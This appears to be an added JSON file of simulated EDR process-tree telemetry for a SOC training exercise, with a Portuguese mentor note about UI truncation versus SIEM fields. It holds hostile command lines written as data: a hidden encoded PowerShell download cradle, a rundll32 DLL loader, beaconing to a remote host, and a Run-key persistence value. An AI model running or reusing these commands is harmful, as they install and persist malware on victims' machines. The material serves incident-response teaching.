@@ -1,0 +1,86 @@
+{
+  "host": "WKS-FIN-0455",
+  "usuario": "corp\\jsilva",
+  "janela": "2026-10-20 13:58:00 - 14:55:00 BRT",
+  "fuso_dos_timestamps": "BRT (UTC-3)",
+  "arvore": [
+    {
+      "eventtime": "13:58:31",
+      "processname": "chrome.exe",
+      "parentprocessname": "explorer.exe",
+      "commandline": "chrome.exe --type=renderer",
+      "nota": "navegador ja estava aberto desde 08:12"
+    },
+    {
+      "eventtime": "14:00:04",
+      "transactionstring": "File Create",
+      "processname": "chrome.exe",
+      "filename": "NFe_884521.zip",
+      "filepath": "C:\\Users\\jsilva\\Downloads\\NFe_884521.zip",
+      "filesize": 41216,
+      "filehash": "sha256:7c1f9a2e44b8d3c05a19ee7f0b62d4418ac93f5d2e7b6140aa8c3f91de052b7a"
+    },
+    {
+      "eventtime": "14:02:19",
+      "transactionstring": "Process Create",
+      "processname": "NFe_884521.lnk",
+      "parentprocessname": "explorer.exe",
+      "commandline": "C:\\Users\\jsilva\\AppData\\Local\\Temp\\Temp1_NFe_884521.zip\\NFe_884521.lnk"
+    },
+    {
+      "eventtime": "14:02:44",
+      "transactionstring": "Process Create",
+      "processname": "cmd.exe",
+      "parentprocessname": "explorer.exe",
+      "commandline": "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4A..."
+    },
+    {
+      "eventtime": "14:02:47",
+      "transactionstring": "Process Create",
+      "processname": "powershell.exe",
+      "parentprocessname": "cmd.exe",
+      "commandline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A... [exibicao truncada em 260 chars no console do EDR]"
+    },
+    {
+      "eventtime": "14:02:51",
+      "transactionstring": "Network Connection",
+      "processname": "powershell.exe",
+      "destinationhostname": "cdn-nfe-assets.com",
+      "destinationaddress": "192.0.2.17",
+      "destinationport": 443
+    },
+    {
+      "eventtime": "14:02:58",
+      "transactionstring": "File Create",
+      "processname": "powershell.exe",
+      "filename": "msupdate.dll",
+      "filepath": "C:\\Users\\jsilva\\AppData\\Local\\Temp\\msupdate.dll",
+      "filesize": 284672,
+      "filehash": "sha256:e2a7d10c9b4f3e8871d5c06a2fb94e7d3188c05be6a24f9170dd3cb8e45a2f16"
+    },
+    {
+      "eventtime": "14:03:02",
+      "transactionstring": "Process Create",
+      "processname": "rundll32.exe",
+      "parentprocessname": "powershell.exe",
+      "commandline": "rundll32.exe C:\\Users\\jsilva\\AppData\\Local\\Temp\\msupdate.dll,Start"
+    },
+    {
+      "eventtime": "14:03:09",
+      "transactionstring": "Network Connection",
+      "processname": "rundll32.exe",
+      "destinationhostname": "api-telemetry-sync.com",
+      "destinationaddress": "198.51.100.62",
+      "destinationport": 443,
+      "nota": "repete a cada 58-67s ate 14:55 (fim da janela coletada)"
+    },
+    {
+      "eventtime": "14:03:40",
+      "transactionstring": "Registry Set",
+      "processname": "rundll32.exe",
+      "resourcename": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSUpdateSvc",
+      "valor": "rundll32.exe C:\\Users\\jsilva\\AppData\\Local\\Temp\\msupdate.dll,Start"
+    }
+  ],
+  "_nota_mentor": "O CONSOLE do EDR trunca a EXIBICAO da linha de comando em 260 caracteres, mas o campo normalizado no SIEM (ver 01-securonix-violation.json) carrega o valor completo. Isso nao e contradicao: e a mesma telemetria aparecendo diferente em duas telas. Licao de telemetria: 'nao vi o valor' pode ser limite da INTERFACE, nao do dado -- confirme sempre no campo normalizado antes de concluir que o dado nao existe. Se o analista disser que o comando esta truncado e por isso nao da para decodificar, pergunte: 'a tela trunca ou o campo trunca? onde mais esse campo aparece?'"
+}
